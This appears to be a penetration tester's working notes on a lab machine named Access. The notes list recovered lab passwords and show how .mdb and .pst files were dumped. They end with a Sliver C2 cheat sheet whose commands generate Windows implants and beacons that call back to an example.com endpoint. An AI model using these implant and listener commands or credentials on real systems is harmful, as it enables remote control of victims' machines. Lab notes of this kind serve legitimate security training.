# Access Notes

## Data 

IP:  10.10.10.98
OS:
Hostname:
Domain:  / Domain SID:
Machine Purpose: 
Services:
Service Languages:
Users: John, Security
Credentials:

access4u@security is password for 'Access Control.zip'
"security" - 4Cc3ssC0ntr0ller
john - john@megacorp.com
security@accesscontrolsystems.com

## Objectives

## Target Map

![](Access-map.excalidraw.md)

## Solution Inventory Map


### Todo 

What is LON-MC6 - https://support.microsoft.com/en-us/topic/ms09-042-vulnerability-in-telnet-could-allow-remote-code-execution-7d71e702-0539-73ab-dbbe-2ac5502c8420



Make Excalidraw

### Done

dumpingftp.png
https://en.wikipedia.org/wiki/Microsoft_Access
Install [mbdtools](https://www.kali.org/tools/mdbtools/)
```bash
# mdbtools for mdb databse
# pstutils for the .pst file 
sudo apt install mdbtools pstutils
```

JET4.png
```bash
mdb-tables backup.mdb > all-tables
```

```bash
mdb-hexdump backup.mdb
```
afavouriteword.png
creds.png
3333s.png

access4u@security is password for 'Access Control.zip'

passwordaccountandversions.png

https://linux.die.net/man/1/readpst
```bash
readpst Access\ Control.pst
cat Access\ Control.mbox
```

John Carter is mentioned in USERINFO.c
johncarter.png

https://vulners.com/nessus/SMB_NT_MS09-042.NASL - trick a user or SSRF with telnet 

security-4Cc3ssC0ntr0ller.png

yawcam.png

systeminfo.png

ZKTeco.png

netdogssaddogs.png

```go
sliver
// View all implants
implant
// Generate Beacons and Sessions
generate
// Choice one C2 endpoint using:
// --wg is wireguard 
--mtls --wg --http --dns
// Session are sessions
generate --mtls --os windows --save 
// Beacons are asychronous 
generate beacon --mtls example.com --save /Users/moloch/Desktop
// Regenerate
regenerate
// listeners
mtls
wg
https
http
dns
// Jonbs to view and manage listners
jobs

```